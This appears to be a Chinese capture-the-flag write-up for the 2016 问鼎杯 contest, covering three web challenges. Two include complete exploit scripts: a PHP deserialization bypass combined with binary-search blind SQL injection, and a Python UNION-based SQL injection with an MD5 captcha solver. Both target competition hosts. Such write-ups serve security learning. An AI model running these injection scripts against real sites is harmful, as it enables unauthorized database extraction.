# 问鼎杯2016

## 2-1

没什么好说的...就是脑洞

提交的url藏在页面里，搜一下`fulaige`可以找到提交token和key的url。然后是找token和key。

页面内联CSS中会有一项`t0ken: rgb(X, Y, Z)`，发几个请求diff一下就能注意到这里。
那么脑洞一下易知XYZ转成16进制后就是token。

然后是找key，css+html都藏过了那么就是藏在js里了吧。一开始注意到jquery 1.9.3搜不到这个版本，觉得藏在这里面。然后在控制台敲了个key浏览器就把key打出来了。

那么把key和token填在一开始得到的url里就能看到flag了。

## 2-2

跟`HITCON 2016`的`babytrick`很像，只是最后拿flag过程变成了盲注而已。

核心思路：
- 利用反序列化异常对象，来阻止`__wakeup`中的sql过滤代码被执行，直接执行`__destruct`。具体可以看HITCON的writeup，这里就不在多说了。
- 利用`>=`，`ascii()`，`substr()`等sql函数进行二分查找盲注加速拿flag

payload生成及获取flag代码：
```php
<?php

$res = "WDFLAG={Nation_is_more_important_than_anyt";

class COMEON {
    private $method;
    private $args;
    private $conn;

    function generate($str) {
        global $res;
        $this->conn = null;
        $this->method = 'show';
        $str = bin2hex($str);
        $pos = strlen($res)+1;
        $this->args = ["admin' and ascii(substr(password,{$pos},1)) >= 0x{$str} -- "];
        $this->isGenerator = true;
    }
    
    function __destruct() {
        if(isset($this->isGenerator)) return;
        if (!$this->conn) 
            echo "connect to db. ";
        echo "deconstruct called. ";
        //var_dump($this);
        if (in_array($this->method, array("show", "source"))) { 
            @call_user_func_array(array($this, $this->method), $this->args); 
        } 
    }
    
    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
    
    function show() { 
        list($username) = func_get_args(); 
        if(preg_match("/\b(select|insert|update|delete)\b/i",$username)){ 
            die("hello,hacker!"); 
        }
        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username); 
        var_dump($sql);
    } 
}


$a = new COMEON();

$printable = [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'];

function guess($i) {
    global $res, $a, $printable;
    $a->generate($i);
    $data = serialize($a); $data = str_replace(';N;', ';O:9:"Exception":2:{s:7:"*file";R:4;};', $data);
    $url = "http://sec3.hdu.edu.cn/831291d147f8429887af12bcb53e2d91/?data=".urlencode($data);
    $ret = file_get_contents($url);
    //var_dump($i . " " . $ret);
    return $ret === ' {"msg":"admin is admin"}';
}

// return max "admin is admin"
function binarySearch($fl, $fr) {
    global $printable;
    if($fl == $fr) {
        return guess($printable[$fl]) ? $fl : -1;
    }
    if($fl == $fr - 1) {
        if(guess($printable[$fr])) return $fr;
        return binarySearch($fl, $fl);
    }
    $m = ($fl + $fr) >> 1;
    if(guess($printable[$m])) {
        $tmp = binarySearch($m+1, $fr);
        if($tmp !== -1) return $tmp;
        else return $m;
    } else {
        return binarySearch($fl, $m-1);
    }
}

for($i =0; $i < 10; $i++) {
  $tmp = $printable[binarySearch(0, count($printable)-1)];
  $res .= $tmp;
  var_dump($res);
}

?>
```

## 5-2

没什么好说的..基本上就是裸注入
貌似`username`必须要为`user`，所以从`id`字段做手脚
把要注入回显的有用信息的字符串转成ascii码存在`id`字段里，一字节一字节地读取即可。
要先在`information_schema`表里查查`table_name`和`column_name`，可知是在`fffflag`表内的`fflag`列中。

代码：
```python
from hashlib import md5
import requests

def innerText(txt, st, fin):
    txt = txt[txt.index(st)+len(st):]
    return txt[:txt.index(fin)]

def solve(cap):
    t=0
    while md5(str(t)).hexdigest()[:len(cap)] != cap:
        t+=1
    return str(t)
    
ss = ''
for i in xrange(1,10000):
    s = requests.session()
    a = s.get('http://sec2.hdu.edu.cn/e33cdf8c2126fc5490fbc5d7fc269036/').content
    cap = innerText(a, ",0,4) =='", "'")
    ans = solve(cap)
    payload = '''(select group_concat(fflag) from ffff1ag)'''
    payload = '''200 union select ascii(mid(%s,%d,1)) as id,username from users -- ''' % (payload,i)
    ret = s.post('http://sec2.hdu.edu.cn/e33cdf8c2126fc5490fbc5d7fc269036/', data={'id': payload, 'code': ans}).text
    c = chr(int(innerText(ret, '<th>name</th></tr><tr><td>', '</td>')))
    if ord(c) == 0: break
    print c
    ss += c
    
print ss
```
